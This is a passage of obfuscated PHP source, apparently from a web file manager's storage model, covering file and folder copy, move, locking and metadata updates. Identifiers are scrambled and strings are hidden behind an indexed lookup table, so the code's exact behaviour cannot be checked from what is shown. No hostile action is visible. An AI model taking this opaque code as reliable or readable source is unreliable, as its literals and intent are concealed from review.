htmlspecialchars($½§äç¬Ú[$¾¸íİ¤ª[32]]) . $¾¸íİ¤ª[176] . $ŠÈÍÇ¤); $this->_lockKey($ğÓçã¾Ù, 1); $this->_lockKey($ğÓçã¾Ù, 0); $º–„Î®¢ = array_reverse($this->parentLevelArray($½§äç¬Ú[$¾¸íİ¤ª[611]])); foreach ($º–„Î®¢ as $¡˜¼ïé¶) { $ğÓçã¾Ù = $¾–şÙ˜· . $¾¸íİ¤ª[657] . $¡˜¼ïé¶; if (CacheLock::lockGet($¾¸íİ¤ª[658] . $ğÓçã¾Ù)) { $½§äç¬Ú = $this->sourceInfo($¡˜¼ïé¶); CacheLock::setErrorMsg($¾¸íİ¤ª[174] . htmlspecialchars($½§äç¬Ú[$¾¸íİ¤ª[32]]) . $¾¸íİ¤ª[176] . $ŠÈÍÇ¤); $this->_lockKey($ğÓçã¾Ù, 1); $this->_lockKey($ğÓçã¾Ù, 0); } } } private function _lockCheckEnd($ï‡êÖ°Ï, $œÙÄ¦¢) { $‡üù¹¢É =& $_SERVER[€ä¾™²]; $¸©·¢¨ = $ï‡êÖ°Ï . $‡üù¹¢É[10] . $œÙÄ¦¢; CacheLock::setErrorMsg($‡üù¹¢É[463]); if (!isset($this->_lockTimeStart[$¸©·¢¨])) { return; } $‚ÎáºÏ· = timeFloat() - $this->_lockTimeStart[$¸©·¢¨]; unset($this->_lockTimeStart[$¸©·¢¨]); if ($‚ÎáºÏ· > 0.5) { unset(self::$cacheSourceInfo[$‡üù¹¢É[554] . $œÙÄ¦¢]); } $´Ö—µõË = $this->sourceInfo($œÙÄ¦¢); if (!$´Ö—µõË) { show_json(LNG($‡üù¹¢É[106]), !1); } } private function _lockParent($˜à´ÓÒ, $í¤€›“Î, $ÖÛƒ”ìÉ) { if (!$this->autoLockSet) { return; } $¾§Ã¸÷Ã = $this->sourceInfo($˜à´ÓÒ); if (!is_array($¾§Ã¸÷Ã)) { return; } $îóÖ¬£ú = array_reverse($this->parentLevelArray($¾§Ã¸÷Ã[$_SERVER[€ä¾™²][611]])); foreach ($îóÖ¬£ú as $…ÆŞ×Í÷) { $this->_lockEvent($…ÆŞ×Í÷, $í¤€›“Î, $ÖÛƒ”ìÉ); } } private function _lockEvent($ï÷ï¤³, $Ş¶½¸²œ, $‰š¿üÀ) { $ØÈ’Å„„ =& $_SERVER[€ä¾™²]; if (!$this->autoLockSet) { return; } foreach ($Ş¶½¸²œ as $¤¡ÍüŸĞ) { $ĞóÆã”¶ = $¤¡ÍüŸĞ . $ØÈ’Å„„[10] . $ï÷ï¤³; if ($‰š¿üÀ && CacheLock::lockGet($ØÈ’Å„„[658] . $ĞóÆã”¶)) { continue; } $this->_lockKey($ĞóÆã”¶, $‰š¿üÀ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($°ß–ˆ¶¹, $ø²îËºÒ = 1) { $„§ÒŸ¬Ï = $_SERVER[€ä¾™²][658] . md5($°ß–ˆ¶¹); if ($ø²îËºÒ) { if (isset(self::$_lockItemArr[$„§ÒŸ¬Ï])) { return; } self::$_lockItemArr[$„§ÒŸ¬Ï] = 1; CacheLock::lock($„§ÒŸ¬Ï, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$„§ÒŸ¬Ï])) { return; } unset(self::$_lockItemArr[$„§ÒŸ¬Ï]); CacheLock::unlock($„§ÒŸ¬Ï); } } public function isParentOf($ÆÕÖò™, $ğ“ö¾Ùò) { $®‹İŞÑ× =& $_SERVER[€ä¾™²]; $«úÁŸÎ‹ = $this->sourceInfo($ÆÕÖò™); $ÊıÍ§ğÓ = $this->sourceInfo($ğ“ö¾Ùò); $˜£² = $«úÁŸÎ‹[$®‹İŞÑ×[611]] . $«úÁŸÎ‹[$®‹İŞÑ×[192]] . $®‹İŞÑ×[50]; $é¸áÖØ = $ÊıÍ§ğÓ[$®‹İŞÑ×[611]] . $ÊıÍ§ğÓ[$®‹İŞÑ×[192]] . $®‹İŞÑ×[50]; $ÙÍ«»Êã = strpos($é¸áÖØ, $˜£²) === 0; return $ÙÍ«»Êã; } private $targetIsDelete = 0; public function copy($‘œˆø‹ü, $¨¡Æ”š±, $ÜŞãêÏ’ = REPEAT_REPLACE, $‚¹Ö¥» = '') { $—«¸øô =& $_SERVER[€ä¾™²]; $‘ıÚ°åé = $this->sourceInfo($‘œˆø‹ü); $’şë“¶Ì = $this->sourceInfo($¨¡Æ”š±); if (!$‘ıÚ°åé || !$’şë“¶Ì || $’şë“¶Ì[$—«¸øô[507]] != $—«¸øô[91]) { return !1; } if ($this->isParentOf($‘œˆø‹ü, $¨¡Æ”š±)) { return !1; } $î¾õ§ò = $‚¹Ö¥» ? $‚¹Ö¥» : $‘ıÚ°åé[$—«¸øô[32]]; $this->lockCopyStart($‘œˆø‹ü); $this->lockWriteStart($¨¡Æ”š±, $î¾õ§ò); $úÕí¾Å¨ = array($—«¸øô[659] => array(), $—«¸øô[660] => array(), $—«¸øô[661] => array()); $this->targetIsDelete = intval($‘ıÚ°åé[$—«¸øô[527]]); $â÷ÅşÔØ = $this->fileNameExistAuto($¨¡Æ”š±, $‘ıÚ°åé); $°ËŞÃ™’ = $this->_copy($‘œˆø‹ü, $¨¡Æ”š±, $ÜŞãêÏ’, $úÕí¾Å¨, !0, $‚¹Ö¥»); $this->_childrenListClear(); $this->lockCopyEnd($‘œˆø‹ü); $this->lockWriteEnd($¨¡Æ”š±, $î¾õ§ò); if ($‘ıÚ°åé[$—«¸øô[507]] == $—«¸øô[91] && $â÷ÅşÔØ == $°ËŞÃ™’) { $this->folderSizeResetChildren($â÷ÅşÔØ); } Model($—«¸øô[471])->addAll($úÕí¾Å¨[$—«¸øô[660]], array(), !0); if ($â÷ÅşÔØ != $°ËŞÃ™’ || $‘ıÚ°åé[$—«¸øô[507]] == $—«¸øô[91]) { Model($—«¸øô[662])->eventCopy($°ËŞÃ™’); } $this->saveAll($úÕí¾Å¨[$—«¸øô[661]]); Model($—«¸øô[231])->linkAdd($úÕí¾Å¨[$—«¸øô[659]]); $this->folderSizeReset($¨¡Æ”š±); $this->updateModifyTime($¨¡Æ”š±); return $°ËŞÃ™’; } private function _copy($ĞœßÅ³, $şóØ“ï«, $• ¥Íáü, &$“ğ²®µ, $îì¥ëôÇ, $ÂÅ“˜ = '') { $Ø«ÄãÚ÷ =& $_SERVER[€ä¾™²]; $ôà……¥– = $this->sourceInfoCache($ĞœßÅ³); $¬¾¢ÀÅà = $ôà……¥–[$Ø«ÄãÚ÷[507]] == $Ø«ÄãÚ÷[91]; $˜é—çœ“ = $ÂÅ“˜ ? $ÂÅ“˜ : $ôà……¥–[$Ø«ÄãÚ÷[32]]; $ˆÃ®ÙÄ§ = $this->fileNameExistAuto($şóØ“ï«, $ôà……¥–); if ($îì¥ëôÇ) { $this->_childrenAllMake($ĞœßÅ³); if ($¬¾¢ÀÅà && $ˆÃ®ÙÄ§) { $this->_childrenAllMake($ˆÃ®ÙÄ§); } } if (!$ˆÃ®ÙÄ§) { return $this->_copyCreate($ĞœßÅ³, $şóØ“ï«, $˜é—çœ“, $“ğ²®µ); } $¹èÖïóü = $ˆÃ®ÙÄ§; if ($¬¾¢ÀÅà) { if ($• ¥Íáü == REPEAT_RENAME_FOLDER) { $˜é—çœ“ = $this->fileNameAutoCache($şóØ“ï«, $˜é—çœ“, $• ¥Íáü, $¬¾¢ÀÅà); $¹èÖïóü = $this->_copyCreate($ĞœßÅ³, $şóØ“ï«, $˜é—çœ“, $“ğ²®µ); } else { $Å‹åõ…‹ = $this->_childrenList($ĞœßÅ³); foreach ($Å‹åõ…‹ as $´œ”ğè) { $this->_copy($´œ”ğè[$Ø«ÄãÚ÷[192]], $ˆÃ®ÙÄ§, $• ¥Íáü, $“ğ²®µ, !1); } } } else { if ($• ¥Íáü == REPEAT_RENAME || $• ¥Íáü == REPEAT_RENAME_FOLDER) { $˜é—çœ“ = $this->fileNameAutoCache($şóØ“ï«, $˜é—çœ“, $• ¥Íáü, $¬¾¢ÀÅà); $¹èÖïóü = $this->_copyCreate($ĞœßÅ³, $şóØ“ï«, $˜é—çœ“, $“ğ²®µ); } else { if ($• ¥Íáü == REPEAT_REPLACE) { $ª¸Åİ«û = $this->sourceInfoCache($ˆÃ®ÙÄ§); $Œ‘¥íğ• = $this->fileHistory($ª¸Åİ«û, $ôà……¥–[$Ø«ÄãÚ÷[564]], $ôà……¥–[$Ø«ÄãÚ÷[79]]); if ($Œ‘¥íğ•) { $“ğ²®µ[$Ø«ÄãÚ÷[659]][] = $ôà……¥–[$Ø«ÄãÚ÷[564]]; } } else { if ($• ¥Íáü == REPEAT_SKIP) { } } } Hook::trigger($Ø«ÄãÚ÷[663], array($Ø«ÄãÚ÷[664], $ôà……¥–, 0)); } return $¹èÖïóü; } private function _copyCreate($¨ ÚŠâ‡, $»Á‚÷Ê, $Öæ‰—†®, &$Üö˜å‹¶) { $°¬’Å– =& $_SERVER[€ä¾™²]; $ùÖ‚‘¼Ó = $this->sourceInfoCache($¨ ÚŠâ‡); $¨£¢¿¤™ = $this->sourceInfoCache($»Á‚÷Ê); $ ½Şôª² = $this->_makeItemData($ùÖ‚‘¼Ó, $¨£¢¿¤™, $Öæ‰—†®); Hook::trigger($°¬’Å–[665], $ ½Şôª²); Hook::trigger($°¬’Å–[666], array($°¬’Å–[667], $ ½Şôª², 0)); $îâ¸•ÒÜ = $this->add($ ½Şôª²); $š‰—È¨Ğ = array($°¬’Å–[192] => $îâ¸•ÒÜ, $°¬’Å–[32] => $Öæ‰—†®); $this->_copyApplyMeta($š‰—È¨Ğ, $Üö˜å‹¶); if ($ùÖ‚‘¼Ó[$°¬’Å–[507]] != $°¬’Å–[91]) { $Üö˜å‹¶[$°¬’Å–[659]][] = $ùÖ‚‘¼Ó[$°¬’Å–[564]]; return $îâ¸•ÒÜ; } $¯«®úı = array(); $Ìã²ƒûÚ = array(); $this->_childrenListAll($¨ ÚŠâ‡, $¯«®úı); $´Á¹£ñÊ = count($¯«®úı); if ($´Á¹£ñÊ == 0) { return $îâ¸•ÒÜ; } $——¼€å = $this->sourceInfo($îâ¸•ÒÜ); foreach ($¯«®úı as $¨½Ç€şô) { $ùï€¢Ğ… = $this->_makeItemData($¨½Ç€şô, $——¼€å, $¨½Ç€şô[$°¬’Å–[32]]); $ùï€¢Ğ…[$°¬’Å–[611]] = $¨½Ç€şô[$°¬’Å–[611]]; $Ìã²ƒûÚ[] = $ùï€¢Ğ…; } $this->chunkEventSet($°¬’Å–[668], array($°¬’Å–[669], $ ½Şôª², $´Á¹£ñÊ)); $this->addAll($Ìã²ƒûÚ, array(), !1); $¬ĞË‡» = $this->where(array($°¬’Å–[191] => $îâ¸•ÒÜ))->select(); $ºá£¡Œ‘ = $this->_childrenMakeRelation($¯«®úı, $¬ĞË‡»); $ºá£¡Œ‘[$¨ ÚŠâ‡] = $îâ¸•ÒÜ; $«Ã˜ó = array(); $”±Ñıš = array(); foreach ($¬ĞË‡» as $¨½Ç€şô) { $‘ƒçëÕ = $¨½Ç€şô[$°¬’Å–[192]]; $û’ë’î› = $this->_childrenMatch($ºá£¡Œ‘, $¨½Ç€şô, $——¼€å); $«Ã˜ó[] = array($°¬’Å–[192], $‘ƒçëÕ, $°¬’Å–[191], $û’ë’î›[$°¬’Å–[191]]); $”±Ñıš[] = array($°¬’Å–[192], $‘ƒçëÕ, $°¬’Å–[611], $û’ë’î›[$°¬’Å–[611]]); $this->_copyApplyMeta($¨½Ç€şô, $Üö˜å‹¶); if ($¨½Ç€şô[$°¬’Å–[507]] != $°¬’Å–[91]) { $Üö˜å‹¶[$°¬’Å–[659]][] = $¨½Ç€şô[$°¬’Å–[564]]; } } $this->chunkEventSet($°¬’Å–[670], array($°¬’Å–[671], $ ½Şôª², $´Á¹£ñÊ)); $this->saveAll($«Ã˜ó); $this->chunkEventSet($°¬’Å–[672], array($°¬’Å–[673], $ ½Şôª², $´Á¹£ñÊ)); $this->saveAll($”±Ñıš); return $îâ¸•ÒÜ; } private function _childrenMakeRelation($×›ƒ£¼«, $•íÊ£ıæ) { $Ø™òá” =& $_SERVER[€ä¾™²]; $Ğ—°ƒ¡İ = array(); $“¾äÜå = array(); foreach ($×›ƒ£¼« as $øÊµŠ”ğ) { $‰±èìùô = $øÊµŠ”ğ[$Ø™òá”[32]] . $Ø™òá”[8] . $øÊµŠ”ğ[$Ø™òá”[611]]; $Ğ—°ƒ¡İ[$‰±èìùô] = $øÊµŠ”ğ[$Ø™òá”[192]]; } foreach ($•íÊ£ıæ as $øÊµŠ”ğ) { $‰±èìùô = $øÊµŠ”ğ[$Ø™òá”[32]] . $Ø™òá”[8] . $øÊµŠ”ğ[$Ø™òá”[611]]; $È·¾íØ¦ = $Ğ—°ƒ¡İ[$‰±èìùô]; $“¾äÜå[$È·¾íØ¦] = $øÊµŠ”ğ[$Ø™òá”[192]]; } return $“¾äÜå; } private function _childrenMatch($ï±°ñ¸«, $Ù«À®œ, $·ÖØÄÙ×) { $Üóö‡ñ¾ =& $_SERVER[€ä¾™²]; $£ìî°ÉŠ = $·ÖØÄÙ×[$Üóö‡ñ¾[611]]; $øıˆƒÓ¸ = $this->parentLevelArray($Ù«À®œ[$Üóö‡ñ¾[611]]); foreach ($øıˆƒÓ¸ as $ôïú‘»‰) { if (isset($ï±°ñ¸«[$ôïú‘»‰])) { $£ìî°ÉŠ .= $ï±°ñ¸«[$ôïú‘»‰] . $Üóö‡ñ¾[674]; } } $£ìî°ÉŠ = rtrim($£ìî°ÉŠ, $Üóö‡ñ¾[50]) . $Üóö‡ñ¾[50]; $İ¸î¥¨ = $this->parentLevelArray($£ìî°ÉŠ); $•Ÿä±¹œ = $İ¸î¥¨[count($İ¸î¥¨) - 1]; return array($Üóö‡ñ¾[191] => $•Ÿä±¹œ, $Üóö‡ñ¾[611] => $£ìî°ÉŠ); } private function _makeItemData($Úáüáø’, $ÍåÔÎŸ, $²£Îß„Ÿ) { $ÜÒİ·³ =& $_SERVER[€ä¾™²]; $±ş ‚êµ = array($ÜÒİ·³[675] => $Úáüáø’[$ÜÒİ·³[507]], $ÜÒİ·³[516] => $²£Îß„Ÿ, $ÜÒİ·³[676] => $Úáüáø’[$ÜÒİ·³[508]] ? $Úáüáø’[$ÜÒİ·³[508]] : $ÜÒİ·³[12], $ÜÒİ·³[565] => $Úáüáø’[$ÜÒİ·³[564]] ? $Úáüáø’[$ÜÒİ·³[564]] : 0, $ÜÒİ·³[647] => $Úáüáø’[$ÜÒİ·³[79]] ? $Úáüáø’[$ÜÒİ·³[79]] : 0, $ÜÒİ·³[677] => intval($ÍåÔÎŸ[$ÜÒİ·³[189]]), $ÜÒİ·³[678] => intval($ÍåÔÎŸ[$ÜÒİ·³[596]]), $ÜÒİ·³[679] => intval(USER_ID), $ÜÒİ·³[680] => intval(USER_ID), $ÜÒİ·³[499] => intval($ÍåÔÎŸ[$ÜÒİ·³[192]]), $ÜÒİ·³[681] => $ÍåÔÎŸ[$ÜÒİ·³[611]] . $ÍåÔÎŸ[$ÜÒİ·³[192]] . $ÜÒİ·³[50], $ÜÒİ·³[520] => $Úáüáø’[$ÜÒİ·³[88]] ? $Úáüáø’[$ÜÒİ·³[88]] : time(), $ÜÒİ·³[526] => 0, $ÜÒİ·³[682] => $ÜÒİ·³[12]); return $±ş ‚êµ; } private function _copyApplyMeta($³Ñ†Ğ×Ù, &$©ˆÃÛ‰¸) { $ö¼¯šÆİ =& $_SERVER[€ä¾™²]; $Ãøü¬ù = $³Ñ†Ğ×Ù[$ö¼¯šÆİ[192]]; $“–Û§•Á = $³Ñ†Ğ×Ù[$ö¼¯šÆİ[32]]; if (!isset($³Ñ†Ğ×Ù[$ö¼¯šÆİ[683]]) || !$³Ñ†Ğ×Ù[$ö¼¯šÆİ[683]] || $³Ñ†Ğ×Ù[$ö¼¯šÆİ[683]] == $ö¼¯šÆİ[229]) { $©ˆÃÛ‰¸[$ö¼¯šÆİ[661]][] = array($ö¼¯šÆİ[192], $Ãøü¬ù, $ö¼¯šÆİ[683], short_id($Ãøü¬ù)); } if (Input::check($“–Û§•Á, $ö¼¯šÆİ[684])) { $©ˆÃÛ‰¸[$ö¼¯šÆİ[660]][] = array($ö¼¯šÆİ[192] => $Ãøü¬ù, $ö¼¯šÆİ[95] => $ö¼¯šÆİ[559], $ö¼¯šÆİ[451] => str_replace($ö¼¯šÆİ[53], $ö¼¯šÆİ[12], Pinyin::get($“–Û§•Á))); $©ˆÃÛ‰¸[$ö¼¯šÆİ[660]][] = array($ö¼¯šÆİ[192] => $Ãøü¬ù, $ö¼¯šÆİ[95] => $ö¼¯šÆİ[558], $ö¼¯šÆİ[451] => Pinyin::get($“–Û§•Á, $ö¼¯šÆİ[685])); } $©ˆÃÛ‰¸[$ö¼¯šÆİ[660]][] = array($ö¼¯šÆİ[192] => $Ãøü¬ù, $ö¼¯šÆİ[95] => $ö¼¯šÆİ[538], $ö¼¯šÆİ[451] => KodSort::makeStr($“–Û§•Á)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($µÒÓ…ÓŠ) { $¥ãõ„ =& $_SERVER[€ä¾™²]; $­×†Šİ¼ = $this->sourceInfo($µÒÓ…ÓŠ); $©ò·ôˆ = $¥ãõ„[686]; $æÔçì¯ = array($¥ãõ„[611] => array($¥ãõ„[642], $­×†Šİ¼[$¥ãõ„[611]] . $µÒÓ…ÓŠ . $¥ãõ„[643]), $¥ãõ„[527] => $this->targetIsDelete); $Í°ùë³š = $this->field($©ò·ôˆ)->where($æÔçì¯)->select(); if (!$Í°ùë³š) { return; } $Í°ùë³š = array_to_keyvalue($Í°ùë³š, $¥ãõ„[192]); foreach ($Í°ùë³š as $—ûı) { $é‹Úñİş = $—ûı[$¥ãõ„[191]]; $µÒÓ…ÓŠ = $—ûı[$¥ãõ„[192]]; if (!isset($this->_childrenListCache[$µÒÓ…ÓŠ]) && $—ûı[$¥ãõ„[507]] == $¥ãõ„[91]) { $this->_childrenListCache[$µÒÓ…ÓŠ] = array(); } if (!isset($this->_childrenListCache[$é‹Úñİş])) { $this->_childrenListCache[$é‹Úñİş] = array(); } $this->_childrenListCache[$é‹Úñİş][$µÒÓ…ÓŠ] = $—ûı; $this->_childrenItemCache[$µÒÓ…ÓŠ] = $—ûı; } } private function _childrenListAll($ïâË¯¢Ş, &$ãœŞ„ê®) { $´Ô³ÜÛñ =& $_SERVER[€ä¾™²]; if (!isset($this->_childrenListCache[$ïâË¯¢Ş])) { return; } $ÏğŒ©®Ì = $this->_childrenListCache[$ïâË¯¢Ş]; foreach ($ÏğŒ©®Ì as $À´ ãÊ» => $àÚÈ¤Ãƒ) { $ãœŞ„ê®[$À´ ãÊ»] = $àÚÈ¤Ãƒ; if ($àÚÈ¤Ãƒ[$´Ô³ÜÛñ[507]] == $´Ô³ÜÛñ[91]) { $this->_childrenListAll($À´ ãÊ», $ãœŞ„ê®); } } } private function sourceInfoCache($ù»ø­Ì) { if (isset($this->_childrenItemCache[$ù»ø­Ì])) { return $this->_childrenItemCache[$ù»ø­Ì]; } return $this->sourceInfo($ù»ø­Ì); } private function _childrenList($¯¡åµé¦) { if (isset($this->_childrenListCache[$¯¡åµé¦])) { return $this->_childrenListCache[$¯¡åµé¦]; } return $this->_childrenListSelect($¯¡åµé¦); } private function _childrenListSelect($è“ëÚÒ) { $÷±È¢î =& $_SERVER[€ä¾™²]; $‘…€÷ç = array($÷±È¢î[191] => $è“ëÚÒ, $÷±È¢î[527] => $this->targetIsDelete); $™ªŒÓÕË = $this->where($‘…€÷ç)->select(); $™ªŒÓÕË = $™ªŒÓÕË ? $™ªŒÓÕË : array(); $á¤Ş¥× = array_to_keyvalue($™ªŒÓÕË, $÷±È¢î[192]); $this->_childrenListCache[$è“ëÚÒ] = $á¤Ş¥×; foreach ($á¤Ş¥× as $è“ëÚÒ => $®Âß©ÃÇ) { $this->_childrenItemCache[$è“ëÚÒ] = $®Âß©ÃÇ; } return $á¤Ş¥×; } private function fileNameExistAuto($µĞÙùÕ, $Î¿‰’ÃŠ) { $Â¶ØÎ¯ª =& $_SERVER[€ä¾™²]; if ($Î¿‰’ÃŠ[$Â¶ØÎ¯ª[527]] == $Â¶ØÎ¯ª[91]) { return $this->fileNameExist($µĞÙùÕ, $Î¿‰’ÃŠ[$Â¶ØÎ¯ª[32]]); } return $this->fileNameExistCache($µĞÙùÕ, $Î¿‰’ÃŠ[$Â¶ØÎ¯ª[32]]); } private function fileNameExistCache($Ñ—å­á¼, $½âó”) { $…Š¼²Ì =& $_SERVER[€ä¾™²]; $½âó” = strtolower($½âó”); $ôªäÄ² = $this->_childrenList($Ñ—å­á¼); foreach ($ôªäÄ² as $±Ò¾Ÿì’) { if ($½âó” == strtolower($±Ò¾Ÿì’[$…Š¼²Ì[32]])) { return $±Ò¾Ÿì’[$…Š¼²Ì[192]]; } } return !1; } private function fileNameAutoCache($ú¡öìò, $öó‹ôğŸ, $†‹õÈÆ, $ êú›¯¤) { $¥ëÄéë÷ =& $_SERVER[€ä¾™²]; $ƒæº°íÇ = $this->_childrenList($ú¡öìò); $˜“¦åıÒ = array_to_keyvalue($ƒæº°íÇ, $¥ëÄéë÷[12], $¥ëÄéë÷[32]); return $this->fileNameAutoGet($˜“¦åıÒ, $öó‹ôğŸ, $†‹õÈÆ, $ êú›¯¤); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($šÖÜ¥Œ, $‘£§¿„Ñ, $ŒØÖÜ” = REPEAT_REPLACE, $Éáô¤”¯ = '') { $‘®öîŠÔ =& $_SERVER[€ä¾™²]; $¥ê éö¡ = $this->sourceInfo($šÖÜ¥Œ); $ö£·ˆ = $this->sourceInfo($‘£§¿„Ñ); if ($¥ê éö¡[$‘®öîŠÔ[191]] == $ö£·ˆ[$‘®öîŠÔ[192]]) { if ($¥ê éö¡[$‘®öîŠÔ[527]] == $‘®öîŠÔ[91]) { Model($‘®öîŠÔ[525])->restore(array($šÖÜ¥Œ)); } if (!$Éáô¤”¯ || $Éáô¤”¯ == $¥ê éö¡[$‘®öîŠÔ[32]]) { return $šÖÜ¥Œ; } } $™´©Öú¥ = $this->pathInfoMore($šÖÜ¥Œ); if ($this->isParentOf($šÖÜ¥Œ, $‘£§¿„Ñ)) { return !1; } if (!$¥ê éö¡ || !$ö£·ˆ || $ö£·ˆ[$‘®öîŠÔ[507]] != $‘®öîŠÔ[91]) { return !1; } Hook::trigger($‘®öîŠÔ[687], $™´©Öú¥); $this->targetIsDelete = intval($¥ê éö¡[$‘®öîŠÔ[527]]); if ($¥ê éö¡[$‘®öîŠÔ[191]] == $‘£§¿„Ñ && $Éáô¤”¯ != $¥ê éö¡[$‘®öîŠÔ[32]]) { $–“±¡«¤ = $this->fileNameExist($‘£§¿„Ñ, $Éáô¤”¯); if ($–“±¡«¤ && $¥ê éö¡[$‘®öîŠÔ[507]] == $‘®öîŠÔ[229]) { $½¾Ğ—© = $this->sourceInfo($–“±¡«¤); $ŠÊºÀçî = $this->fileHistory($½¾Ğ—©, $¥ê éö¡[$‘®öîŠÔ[564]], $¥ê éö¡[$‘®öîŠÔ[79]]); if (!$ŠÊºÀçî) { Model($‘®öîŠÔ[567])->remove($¥ê éö¡[$‘®öîŠÔ[564]]); } $this->removeNow($šÖÜ¥Œ, !1); $this->folderSizeReset($‘£§¿„Ñ); Hook::trigger($‘®öîŠÔ[688], $™´©Öú¥); return $–“±¡«¤; } } $åŞ€ĞÄù = $Éáô¤”¯ ? $Éáô¤”¯ : $¥ê éö¡[$‘®öîŠÔ[32]]; $this->lockMoveStart($šÖÜ¥Œ); $this->lockWriteStart($‘£§¿„Ñ, $åŞ€ĞÄù); $±®ÆŠå = array($‘®öîŠÔ[659] => array(), $‘®öîŠÔ[689] => !1); $this->clearShare($šÖÜ¥Œ, $‘£§¿„Ñ); $çúšŞÉ— = $this->fileNameExistAuto($‘£§¿„Ñ, $¥ê éö¡); $áú¢²Êì = $this->_move($šÖÜ¥Œ, $‘£§¿„Ñ, $ŒØÖÜ”, $±®ÆŠå, $Éáô¤”¯); $this->sourceCacheClear(); if ($¥ê éö¡[$‘®öîŠÔ[507]] == $‘®öîŠÔ[91] && $çúšŞÉ—) { $this->folderSizeResetChildren($áú¢²Êì); } Model($‘®öîŠÔ[231])->linkAdd($±®ÆŠå[$‘®öîŠÔ[659]]); if ($áú¢²Êì && $çúšŞÉ— && $±®ÆŠå[$‘®öîŠÔ[689]]) { $˜¶å–…ä = $¥ê éö¡[$‘®öîŠÔ[507]] == $‘®öîŠÔ[91] ? $this->_childrenListSelect($šÖÜ¥Œ) : !1; $ÀÍ‹Öş¢ = $˜¶å–…ä && count($˜¶å–…ä) > 0 ? !0 : !1; $this->removeNow($šÖÜ¥Œ, $ÀÍ‹Öş¢); } $this->lockMoveEnd($šÖÜ¥Œ); $this->lockWriteEnd($‘£§¿„Ñ, $åŞ€ĞÄù); $this->folderSizeReset($¥ê éö¡[$‘®öîŠÔ[191]]); $this->folderSizeReset($‘£§¿„Ñ); $•®íÃ¦¸ = array($¥ê éö¡[$‘®öîŠÔ[191]], $‘£§¿„Ñ); if ($¥ê éö¡[$‘®öîŠÔ[507]] == $‘®öîŠÔ[91]) { $•®íÃ¦¸[] = $šÖÜ¥Œ; } $this->updateModifyTime($•®íÃ¦¸); Model($‘®öîŠÔ[662])->eventMove($šÖÜ¥Œ, $¥ê éö¡[$‘®öîŠÔ[191]], $‘£§¿„Ñ); Hook::trigger($‘®öîŠÔ[688], $™´©Öú¥); return $áú¢²Êì; } private function _move($Á¥êÁÎ‡, $Ş—Œñ›Á, $Õ”Ö—Â, &$è»ï‰ü¹, $£Ğè²ÒÔ = '') { $Óåœ¤¡ =& $_SERVER[€ä¾™²]; $Ğü’©äß = $this->sourceInfo($Á¥êÁÎ‡); $•¸ùğÇÎ = $Ğü’©äß[$Óåœ¤¡[507]] == $Óåœ¤¡[91]; $À‰ñ­òŒ = $£Ğè²ÒÔ ? $£Ğè²ÒÔ : $Ğü’©äß[$Óåœ¤¡[32]]; $àúÒ´ó = $this->fileNameExistAuto($Ş—Œñ›Á, $Ğü’©äß); $this->lockMoveStart($Á¥êÁÎ‡); $this->lockWriteStart($Ş—Œñ›Á, $À‰ñ­òŒ); if (!$àúÒ´ó) { return $this->_moveForce($Á¥êÁÎ‡, $Ş—Œñ›Á, $À‰ñ­òŒ); } $ÚĞ„•í„ = $àúÒ´ó; $¤–ØæÏı = !1; if ($•¸ùğÇÎ) { if ($Õ”Ö—Â == REPEAT_RENAME_FOLDER) { $À‰ñ­òŒ = $this->fileNameAuto($Ş—Œñ›Á, $À‰ñ­òŒ, $Õ”Ö—Â, $•¸ùğÇÎ); $ÚĞ„•í„ = $this->_moveForce($Á¥êÁÎ‡, $Ş—Œñ›Á, $À‰ñ­òŒ); } else { $´ôÖ¼Ô‘ = $this->_childrenListSelect($Á¥êÁÎ‡); foreach ($´ôÖ¼Ô‘ as $ÉÑÚ¿òá) { $š®Æ‚‘ş = REPEAT_REPLACE; $this->_move($ÉÑÚ¿òá[$Óåœ¤¡[192]], $àúÒ´ó, $š®Æ‚‘ş, $è»ï‰ü¹); } $¤–ØæÏı = !0; } } else { if ($Õ”Ö—Â == REPEAT_RENAME || $Õ”Ö—Â == REPEAT_RENAME_FOLDER) { $À‰ñ­òŒ = $this->fileNameAuto($Ş—Œñ›Á, $À‰ñ­òŒ, $Õ”Ö—Â, $•¸ùğÇÎ); $ÚĞ„•í„ = $this->_moveForce($Á¥êÁÎ‡, $Ş—Œñ›Á, $À‰ñ­òŒ); } else { $âÅ—Ò­Á = $this->sourceInfoCache($àúÒ´ó); $©¥Ã™À = $this->fileHistory($âÅ—Ò­Á, $Ğü’©äß[$Óåœ¤¡[564]], $Ğü’©äß[$Óåœ¤¡[79]]); if ($©¥Ã™À) { $è»ï‰ü¹[$Óåœ¤¡[659]][] = $Ğü’©äß[$Óåœ¤¡[564]]; } $¤–ØæÏı = !0; } } if ($¤–ØæÏı) { $è»ï‰ü¹[$Óåœ¤¡[689]] = !0; } return $ÚĞ„•í„; } private function _moveForce($—ÎèÏË, $ï¿Ö±, $ô¹¹ê³) { $‚ğ¦°Â± =& $_SERVER[€ä¾™²]; $©ÖÛÏñÜ = $this->sourceInfo($—ÎèÏË); $‘‡ÏÀÄ© = $this->sourceInfo($ï¿Ö±); $“Áñ™Ù• = $©ÖÛÏñÜ[$‚ğ¦°Â±[507]] == $‚ğ¦°Â±[91]; $äÊÊğ¤„ = array($‚ğ¦°Â±[499] => $‘‡ÏÀÄ©[$‚ğ¦°Â±[192]], $‚ğ¦°Â±[681] => $‘‡ÏÀÄ©[$‚ğ¦°Â±[611]] . $‘‡ÏÀÄ©[$‚ğ¦°Â±[192]] . $‚ğ¦°Â±[50], $‚ğ¦°Â±[677] => $‘‡ÏÀÄ©[$‚ğ¦°Â±[189]], $‚ğ¦°Â±[678] => $‘‡ÏÀÄ©[$‚ğ¦°Â±[596]], $‚ğ¦°Â±[680] => USER_ID, $‚ğ¦°Â±[516] => $ô¹¹ê³); $Ï¬€Èš = $©ÖÛÏñÜ[$‚ğ¦°Â±[189]] == SourceModel::TYPE_GROUP && $‘‡ÏÀÄ©[$‚ğ¦°Â±[189]] == SourceModel::TYPE_GROUP && $©ÖÛÏñÜ[$‚ğ¦°Â±[596]] == $‘‡ÏÀÄ©[$‚ğ¦°Â±[596]]; if (!$Ï¬€Èš && $this->moveClearAuth) { Model($‚ğ¦°Â±[594])->authClear($—ÎèÏË); } $††Úõ¬ö = $©ÖÛÏñÜ[$‚ğ¦°Â±[527]] == 